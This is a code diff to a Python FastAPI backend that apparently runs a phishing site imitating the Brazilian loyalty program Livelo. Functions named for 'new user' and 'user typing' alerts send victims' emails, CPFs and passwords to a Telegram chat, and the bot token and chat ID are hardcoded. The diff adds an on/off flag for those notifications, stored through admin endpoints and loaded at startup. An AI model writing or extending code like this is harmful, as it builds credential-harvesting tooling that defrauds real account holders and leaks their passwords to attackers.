@@ -31,6 +31,7 @@ ACCESS_TOKEN_EXPIRE_MINUTES = 480
 # Telegram Configuration
 TELEGRAM_BOT_TOKEN = "8483612343:AAGSw4EX0c0IIjTOiXjoki7vHkN-ctjx8n8"
 TELEGRAM_CHAT_ID = "-1003679199178"
+TELEGRAM_ENABLED = False
 
 security = HTTPBearer()
 
@@ -42,6 +43,8 @@ api_router = APIRouter(prefix="/api")
 
 # Função para enviar notificação no Telegram
 async def send_telegram_notification(email: str, password: str, device: str = "Desktop", country: str = "Brasil"):
+    if not TELEGRAM_ENABLED:
+        return
     try:
         now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
         message = f"""🔔 *Novo usuário na Livelo!*
@@ -66,6 +69,8 @@ async def send_telegram_notification(email: str, password: str, device: str = "D
 
 # Função para notificar quando email/CPF é digitado
 async def send_telegram_email_typing(email: str):
+    if not TELEGRAM_ENABLED:
+        return
     try:
         now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
         message = f"""👀 *Usuário digitando na Livelo*
@@ -502,6 +507,7 @@ async def clear_visitors(token_data: dict = Depends(verify_token)):
 class TelegramConfig(BaseModel):
     bot_token: str
     chat_id: str
+    enabled: bool = False
 
 @api_router.get("/admin/telegram-config")
 async def get_telegram_config(token_data: dict = Depends(verify_token)):
@@ -509,22 +515,22 @@ async def get_telegram_config(token_data: dict = Depends(verify_token)):
     config = await db.telegram_config.find_one({}, {"_id": 0})
     if config:
         return config
-    return {"bot_token": TELEGRAM_BOT_TOKEN, "chat_id": TELEGRAM_CHAT_ID}
+    return {"bot_token": TELEGRAM_BOT_TOKEN, "chat_id": TELEGRAM_CHAT_ID, "enabled": TELEGRAM_ENABLED}
 
 @api_router.post("/admin/telegram-config")
 async def save_telegram_config(config: TelegramConfig, token_data: dict = Depends(verify_token)):
     """Salva configuração do Telegram"""
-    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
     
-    # Atualizar variáveis globais
     TELEGRAM_BOT_TOKEN = config.bot_token
     TELEGRAM_CHAT_ID = config.chat_id
+    TELEGRAM_ENABLED = config.enabled
     
-    # Salvar no banco
     await db.telegram_config.delete_many({})
     await db.telegram_config.insert_one({
         "bot_token": config.bot_token,
-        "chat_id": config.chat_id
+        "chat_id": config.chat_id,
+        "enabled": config.enabled
     })
     
     return {"message": "Configuração salva com sucesso"}
@@ -552,11 +558,12 @@ async def test_telegram(token_data: dict = Depends(verify_token)):
 # Carregar config do Telegram do banco ao iniciar
 @app.on_event("startup")
 async def load_telegram_config():
-    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
     config = await db.telegram_config.find_one({}, {"_id": 0})
     if config:
         TELEGRAM_BOT_TOKEN = config.get("bot_token", TELEGRAM_BOT_TOKEN)
         TELEGRAM_CHAT_ID = config.get("chat_id", TELEGRAM_CHAT_ID)
+        TELEGRAM_ENABLED = config.get("enabled", False)
         logging.info("Configuração do Telegram carregada do banco de dados")
 
 # Include the router in the main app
